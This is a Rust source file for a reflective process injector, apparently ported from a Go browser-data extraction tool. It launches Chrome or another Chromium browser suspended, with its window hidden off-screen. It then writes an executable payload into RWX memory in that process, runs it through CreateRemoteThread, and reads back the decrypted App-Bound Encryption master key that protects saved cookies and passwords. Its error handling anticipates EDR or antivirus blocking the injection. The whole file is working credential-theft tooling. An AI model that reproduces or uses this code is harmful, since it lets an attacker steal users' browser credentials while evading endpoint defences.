//! Reflective injector (Go: `utils/injector/reflective_windows.go`).
//!
//! Spawns the target browser suspended with an isolated `--user-data-dir`
//! (to escape its ProcessSingleton mutex), writes the patched payload into it,
//! lets its main thread resume briefly, then runs a remote thread at
//! `Bootstrap` and reads the decrypted master key (or a structured error)
//! back from the payload's scratch region before terminating the child.
//!
//! All `unsafe` here is bounded: handles are closed via RAII guards, the
//! remote memory is freed by `TerminateProcess`, and scratch reads are bounds
//! checked against `crate::payload` offsets.

use std::ffi::{OsStr, OsString, c_void};
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::ptr;
use std::time::Duration;

use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, WAIT_OBJECT_0, WAIT_TIMEOUT};
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    CREATE_SUSPENDED, CreateProcessW, CreateRemoteThread, GetExitCodeProcess,
    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW, TerminateProcess,
    WaitForSingleObject,
};
use windows::core::{Error, HRESULT, PCWSTR, PWSTR};

use crate::patch::patch_preresolved_imports;
use crate::payload::{self, KEY_LEN, KEY_STATUS_READY};
use crate::pe::{PeArch, PeError, detect_pe_arch, find_export_file_offset};

/// `STILL_ACTIVE` (0x103) as a plain u32 for exit-code comparisons.
const STILL_ACTIVE: u32 = 0x103;

/// Win32 error code → `windows::core::Error` (windows-core 0.62 dropped
/// `Error::from_win32`; HRESULT::from_win32 is the sanctioned conversion).
fn win32_err(code: u32) -> Error {
    Error::from_hresult(HRESULT::from_win32(code))
}

/// Injector knobs; mirrors Go's `Reflective{WaitTimeout}`.
#[derive(Debug, Clone, Copy)]
pub struct Injector {
    /// Cap on the remote Bootstrap wait (Go: 30s to cover the Elevation
    /// Service cold start after boot).
    pub wait_timeout: Duration,
    /// Post-resume settle before starting the remote thread (Go: 500ms).
    pub resume_settle: Duration,
    /// How long to wait for the child to die after TerminateProcess.
    pub terminate_wait: Duration,
}

impl Default for Injector {
    fn default() -> Self {
        Injector {
            wait_timeout: Duration::from_secs(30),
            resume_settle: Duration::from_millis(500),
            terminate_wait: Duration::from_secs(2),
        }
    }
}

/// Injection failure. Strings mirror Go's `injector.err*` so ABE log lines
/// compare against the Go binary.
#[derive(Debug)]
pub enum InjectError {
    EmptyPayload,
    EmptyExePath,
    Pe(PeError),
    Patch(crate::patch::PatchError),
    MakeTempDir(std::io::Error),
    CreateProcess(Error),
    VirtualAllocEx(Error),
    WriteProcessMemory(Error),
    CreateRemoteThread(Error),
    DeadTarget {
        cause: Error,
        exit_code: u32,
    },
    AliveTargetBlocked(Error),
    WaitForSingleObject(Error),
    RemoteTimeout(Duration),
    WaitState {
        state: u32,
    },
    ReadScratch(Error),
    BadStatus {
        status: u8,
        err_code: u8,
        hresult: u32,
        com_err: u32,
    },
    BadKeyLen(usize),
    Terminate(Error),
}

impl std::fmt::Display for InjectError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        use InjectError::*;
        match self {
            EmptyPayload => write!(f, "injector: empty payload"),
            EmptyExePath => write!(f, "injector: empty exePath"),
            Pe(e) => write!(f, "injector: {e}"),
            Patch(e) => write!(f, "{e}"),
            MakeTempDir(e) => write!(f, "injector: make temp user-data-dir: {e}"),
            CreateProcess(e) => write!(f, "injector: CreateProcess: {e}"),
            VirtualAllocEx(e) => write!(f, "injector: {e}"),
            WriteProcessMemory(e) => write!(f, "injector: WriteProcessMemory: {e}"),
            CreateRemoteThread(e) => write!(f, "injector: {e}"),
            DeadTarget { cause, exit_code } => {
                write!(
                    f,
                    "injector: {cause} (target exited with code 0x{exit_code:x} before injection)"
                )
            }
            AliveTargetBlocked(cause) => write!(
                f,
                "injector: {cause} (target alive; likely EDR/AV blocking remote-thread injection)"
            ),
            WaitForSingleObject(e) => write!(f, "injector: WaitForSingleObject: {e}"),
            RemoteTimeout(wait) => write!(
                f,
                "injector: remote Bootstrap thread timed out after {wait:?}"
            ),
            WaitState { state } => write!(
                f,
                "injector: remote Bootstrap thread wait returned 0x{state:x}"
            ),
            ReadScratch(e) => write!(f, "read scratch header: {e}"),
            BadStatus {
                status,
                err_code,
                hresult,
                com_err,
            } => write!(
                f,
                "injector: payload did not publish key (marker={status:#x} err={} hr=0x{hresult:x} com=0x{com_err:x})",
                payload::abe_err_name(*err_code)
            ),
            BadKeyLen(n) => write!(
                f,
                "injector: payload signaled ready but key length is {n} (want {KEY_LEN})"
            ),
            Terminate(e) => write!(f, "injector: TerminateProcess: {e}"),
        }
    }
}

impl std::error::Error for InjectError {}

/// Payload scratch result: (marker, status, err_code, hresult, com_err, key).
type Scratch = (u8, u8, u8, u32, u32, Option<[u8; KEY_LEN]>);

/// Borrow-guarded handle: closes on drop (Go's `defer windows.CloseHandle`).
struct OwnedHandle(HANDLE);
impl Drop for OwnedHandle {
    fn drop(&mut self) {
        // SAFETY: CloseHandle on a handle we own (or an invalid sentinel) is
        // always safe; failure here is benign (handle already closed).
        unsafe {
            let _ = CloseHandle(self.0);
        }
    }
}

/// Guard that removes the temp UDD (Go: `defer os.RemoveAll(udd)`).
struct UddCleanup(PathBuf);
impl Drop for UddCleanup {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// RAII env override that restores prior values on drop (Go: `setEnvTemporarily`).
/// NOT concurrency-safe by design — inject() is called serially by the
/// single-threaded ABE retriever (same note as Go).
struct EnvOverride(Vec<(String, Option<String>)>);
impl EnvOverride {
    fn set(env: &[(&str, &[u8])]) -> Self {
        let mut saved = Vec::new();
        for (k, v) in env {
            let old = std::env::var_os(k).map(|o| o.to_string_lossy().into_owned());
            // SAFETY (edition 2024): process-global env mutation confined to the
            // abi crate; the value is bytes we own for the call scope.
            unsafe {
                std::env::set_var(k, String::from_utf8_lossy(v).into_owned());
            }
            saved.push((k.to_string(), old));
        }
        EnvOverride(saved)
    }
}
impl Drop for EnvOverride {
    fn drop(&mut self) {
        for (k, old) in &self.0 {
            if let Some(v) = old {
                // SAFETY: restore prior value; see EnvOverride::set.
                unsafe { std::env::set_var(k, v) }
            } else {
                // SAFETY: remove a var we set; see EnvOverride::set.
                unsafe { std::env::remove_var(k) }
            }
        }
    }
}

/// Command line for a singleton-isolated Chromium spawn. `--user-data-dir`
/// escapes the running browser's ProcessSingleton; the window is placed
/// far off-screen so the short-lived browser doesn't visibly pop up on the
/// desktop (Chrome's `--no-startup-window` was rejected upstream because it
/// kills the payload on some forks — repositioning keeps the window created,
/// which is what the payload needs).
fn build_isolated_command_line(exe_path: &str, udd: &str) -> OsString {
    OsString::from(format!(
        "\"{exe_path}\" --user-data-dir=\"{udd}\" --window-position=-32000,-32000 --window-size=1,1"
    ))
}

/// Spawn the target suspended + isolated; returns process info + temp UDD.
fn spawn_suspended(exe_path: &str) -> Result<(PROCESS_INFORMATION, PathBuf), InjectError> {
    let udd = std::env::temp_dir().join(format!("hbd-inj-udd-{}", unique_suffix()));
    std::fs::create_dir_all(&udd).map_err(InjectError::MakeTempDir)?;

    let cmd_line = build_isolated_command_line(exe_path, udd.to_string_lossy().as_ref());
    let mut cmd_wide: Vec<u16> = OsStr::new(&cmd_line)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let exe_wide: Vec<u16> = OsStr::new(exe_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let si = STARTUPINFOW::default();
    let mut pi = PROCESS_INFORMATION::default();

    // SAFETY: si/pi are zeroed; cmd/exe buffers are NUL-terminated UTF-16 for the
    // call length; NULL env/current-dir inherit our block; CREATE_SUSPENDED keeps
    // main() from running until we resume. CreateProcessW retains none of the args.
    let result = unsafe {
        CreateProcessW(
            PCWSTR(exe_wide.as_ptr()),
            Some(PWSTR(cmd_wide.as_mut_ptr())),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(CREATE_SUSPENDED.0),
            None,
            PCWSTR(ptr::null()),
            &si,
            &mut pi,
        )
    };

    match result {
        Ok(()) => Ok((pi, udd)),
        Err(e) => {
            let _ = std::fs::remove_dir_all(&udd);
            Err(InjectError::CreateProcess(e))
        }
    }
}

fn unique_suffix() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    format!("{}-{n}", std::process::id())
}

/// Validate arch + locate the `Bootstrap` export RVA (Go: `validateAndLocateLoader`).
fn validate_and_locate_loader(payload: &[u8]) -> Result<u32, InjectError> {
    let arch = detect_pe_arch(payload).map_err(InjectError::Pe)?;
    if arch != PeArch::Amd64 {
        return Err(InjectError::Pe(PeError::Parse(format!(
            "only amd64 payload is supported (got {})",
            arch.as_str()
        ))));
    }
    find_export_file_offset(payload, "Bootstrap").map_err(InjectError::Pe)
}

/// VirtualAllocEx (RWX) + WriteProcessMemory of the payload (Go: `writeRemotePayload`).
fn write_remote_payload(proc: HANDLE, payload: &[u8]) -> Result<usize, InjectError> {
    // SAFETY: allocating RWX remote memory for the payload; freed only when the
    // child dies (guaranteed in inject() via TerminateProcess). Flags mirror Go.
    // VirtualAllocEx returns a raw pointer in windows-rs 0.62, so NULL = failure.
    let remote_base = unsafe {
        VirtualAllocEx(
            proc,
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if remote_base.is_null() {
        // SAFETY: advisory error read following the failed call.
        return Err(InjectError::VirtualAllocEx(win32_err(
            unsafe { GetLastError() }.0,
        )));
    }

    let mut written: usize = 0;
    // SAFETY: remote_base is the RWX region we just allocated; payload is a
    // valid slice for the call. written is an out-param initialized by the OS.
    unsafe {
        WriteProcessMemory(
            proc,
            remote_base.cast(),
            payload.as_ptr().cast(),
            payload.len(),
            Some(&mut written),
        )
    }
    .map_err(InjectError::WriteProcessMemory)?;
    if written != payload.len() {
        return Err(InjectError::WriteProcessMemory(win32_err(1205)));
    }
    Ok(remote_base as usize)
}

/// Start a remote thread at `entry` and wait for it (Go: `runAndWait`).
fn run_and_wait(proc: HANDLE, entry: usize, wait: Duration) -> Result<(), InjectError> {
    type ThreadRoutine = unsafe extern "system" fn(*mut c_void) -> u32;
    // SAFETY: entry is a validated RVA into the remote image we mapped; the
    // transmuted signature matches Bootstrap(LPVOID). Creating a thread at it
    // is the purpose of this function.
    let start: ThreadRoutine = unsafe { std::mem::transmute(entry) };
    // SAFETY: CreateRemoteThread at the loader entry with NULL param;
    // lpstartaddress takes the routine directly (LPTHREAD_START_ROUTINE is
    // Option<fn>) in windows-rs 0.62 — no Option-wrapping needed beyond Some.
    let h_thread = match unsafe { CreateRemoteThread(proc, None, 0, Some(start), None, 0, None) } {
        Ok(h) => h,
        Err(e) => {
            return Err(if is_target_exiting(proc) {
                InjectError::create_remote_thread_dead(&proc, e)
            } else {
                InjectError::create_remote_thread_blocked(e)
            });
        }
    };
    let _thread_guard = OwnedHandle(h_thread);

    // SAFETY: waits on the just-created thread handle.
    let state =
        unsafe { WaitForSingleObject(h_thread, wait.as_millis().min(u32::MAX as u128) as u32) };
    if state == WAIT_OBJECT_0 {
        Ok(())
    } else if state == WAIT_TIMEOUT {
        Err(InjectError::RemoteTimeout(wait))
    } else {
        Err(InjectError::WaitState { state: state.0 })
    }
}

/// Distinguish a dead target (self-exited: policy/UDP) from a live one whose
/// NtCreateThreadEx was blocked by an EDR/AV hook (Go: same branch).
fn is_target_exiting(proc: HANDLE) -> bool {
    let mut exit_code = 0u32;
    // SAFETY: GetExitCodeProcess on a valid handle; exit_code is a plain out-param.
    unsafe { GetExitCodeProcess(proc, &mut exit_code) }.is_ok() && exit_code != STILL_ACTIVE
}

impl InjectError {
    fn create_remote_thread_dead(proc: &HANDLE, cause: Error) -> Self {
        let mut exit_code = 0u32;
        // SAFETY: GetExitCodeProcess out-param, see is_target_exiting.
        let code = unsafe { GetExitCodeProcess(*proc, &mut exit_code) }
            .map(|_| exit_code)
            .unwrap_or(0);
        InjectError::DeadTarget {
            cause,
            exit_code: code,
        }
    }

    fn create_remote_thread_blocked(cause: Error) -> Self {
        InjectError::AliveTargetBlocked(cause)
    }
}

/// Read the 12-byte scratch header (+ key if status ready). Header at
/// MARKER_OFFSET (0x28): marker, status, extract_err_code, _reserved,
/// hresult (LE u32), com_err (LE u32).
fn read_scratch(proc: HANDLE, remote_base: usize) -> Result<Scratch, InjectError> {
    let mut hdr = [0u8; 12];
    // SAFETY: reads 12 bytes at remote_base+0x28 — the payload's scratch region
    // (still valid: child not yet terminated). Bounds are within the DOS-header
    // area the payload writes (0x28..0x34).
    unsafe {
        ReadProcessMemory(
            proc,
            (remote_base + payload::MARKER_OFFSET) as *const c_void,
            hdr.as_mut_ptr().cast(),
            hdr.len(),
            None,
        )
    }
    .map_err(InjectError::ReadScratch)?;

    let marker = hdr[0];
    let status = hdr[1];
    let err_code = hdr[2];
    // 4-byte windows of a fixed 12-byte array — try_into cannot fail; unwrap_or
    // keeps the no-unwrap-outside-tests discipline anyway.
    let hresult = u32::from_le_bytes(hdr[4..8].try_into().unwrap_or([0; 4]));
    let com_err = u32::from_le_bytes(hdr[8..12].try_into().unwrap_or([0; 4]));

    if status != KEY_STATUS_READY {
        return Ok((marker, status, err_code, hresult, com_err, None));
    }

    let mut key = [0u8; KEY_LEN];
    // SAFETY: reads KEY_LEN bytes at remote_base+KEY_OFFSET (0x40..0x60); the
    // payload writes the key there only after publishing status==READY.
    unsafe {
        ReadProcessMemory(
            proc,
            (remote_base + payload::KEY_OFFSET) as *const c_void,
            key.as_mut_ptr().cast(),
            key.len(),
            None,
        )
    }
    .map_err(InjectError::ReadScratch)?;
    Ok((marker, status, err_code, hresult, com_err, Some(key)))
}

/// Mirror of Go's `Reflective.Inject`.
///
/// `env` supplies `HBD_ABE_ENC_B64` (the base64 ABE ciphertext the payload
/// decrypts). Returns the 32-byte master key.
pub fn inject(
    exe_path: &str,
    payload: &[u8],
    env: &[(&str, &[u8])],
) -> Result<[u8; KEY_LEN], InjectError> {
    if payload.is_empty() {
        return Err(InjectError::EmptyPayload);
    }
    if exe_path.is_empty() {
        return Err(InjectError::EmptyExePath);
    }

    let loader_rva = validate_and_locate_loader(payload)?;
    let patched = patch_preresolved_imports(payload).map_err(InjectError::Patch)?;

    let _env = EnvOverride::set(env);

    let (pi, udd) = spawn_suspended(exe_path)?;
    let (_proc_guard, _thread_guard) = (OwnedHandle(pi.hProcess), OwnedHandle(pi.hThread));
    let _udd_guard = UddCleanup(udd);

    let remote_base = write_remote_payload(pi.hProcess, &patched)?;

    // Resume briefly so ntdll loader init completes; Bootstrap and the later
    // elevation_service COM call rely on a fully-initialized PEB (Go rationale).
    // SAFETY: pi.hThread is the suspended primary thread from CreateProcessW.
    unsafe {
        let _ = ResumeThread(pi.hThread);
    }
    std::thread::sleep(Injector::default().resume_settle);

    let run_result = run_and_wait(
        pi.hProcess,
        remote_base + loader_rva as usize,
        Injector::default().wait_timeout,
    );

    // Read output before termination — after kill the memory is gone.
    let scratch = run_result.and_then(|_| read_scratch(pi.hProcess, remote_base));

    let _ = terminate_and_wait(pi.hProcess, Injector::default().terminate_wait);

    let (marker, status, err_code, hresult, com_err, key) = scratch?;
    if status != KEY_STATUS_READY {
        return Err(InjectError::BadStatus {
            status: marker,
            err_code,
            hresult,
            com_err,
        });
    }
    match key {
        Some(k) if k.len() == KEY_LEN => Ok(k),
        _ => Err(InjectError::BadKeyLen(key.map_or(0, |k| k.len()))),
    }
}

fn terminate_and_wait(proc: HANDLE, wait: Duration) -> Result<(), InjectError> {
    // SAFETY: TerminateProcess reclaims the remote memory before returning
    // (Go does the same); exit code 0 is unused by the caller.
    unsafe { TerminateProcess(proc, 0) }.map_err(InjectError::Terminate)?;
    // SAFETY: waits on the valid process handle.
    unsafe {
        WaitForSingleObject(proc, wait.as_millis().min(u32::MAX as u128) as u32);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn isolated_command_line_repositions_window_offscreen() {
        let cmd = build_isolated_command_line(r"C:\Chrome\chrome.exe", r"C:\Temp\udd");
        assert_eq!(
            r#""C:\Chrome\chrome.exe" --user-data-dir="C:\Temp\udd" --window-position=-32000,-32000 --window-size=1,1"#,
            cmd.to_string_lossy()
        );
    }

    #[test]
    fn payload_scratches_load_and_patch() {
        assert!(validate_and_locate_loader(crate::payload::PAYLOAD_AMD64).is_ok());
    }

    #[test]
    fn rejects_non_amd64_payload() {
        // Two-byte MZ + junk is "not a PE" before arch check; use the embedded
        // real payload's bytes truncated so signature check fails cleanly.
        assert!(validate_and_locate_loader(b"MZ").is_err());
    }
}
